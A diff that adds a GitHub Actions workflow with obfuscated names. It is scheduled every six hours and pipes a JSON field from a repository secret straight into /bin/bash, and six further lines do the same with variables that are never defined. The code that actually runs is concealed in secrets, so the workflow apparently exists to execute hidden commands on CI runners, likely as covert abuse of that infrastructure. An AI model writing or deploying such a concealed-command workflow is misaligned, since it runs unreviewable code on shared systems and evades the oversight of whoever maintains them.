@@ -1,0 +1,22 @@
+name: qiliangping4536
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiliangping4536
+        env:
+          z8077: ${{ secrets.z8077 }}
+        run: |
+          echo $z8077 | jq -r .r3 | /bin/bash
+          echo $em5 | jq -r .hmnmr927 | /bin/bash
+          echo $epzw2 | jq -r .a63027 | /bin/bash
+          echo $js08189 | jq -r .rpm1 | /bin/bash
+          echo $cji7517 | jq -r .tbdm56523 | /bin/bash
+          echo $an01 | jq -r .r03 | /bin/bash
+          echo $hhjla28228 | jq -r .yor24375 | /bin/bash
+
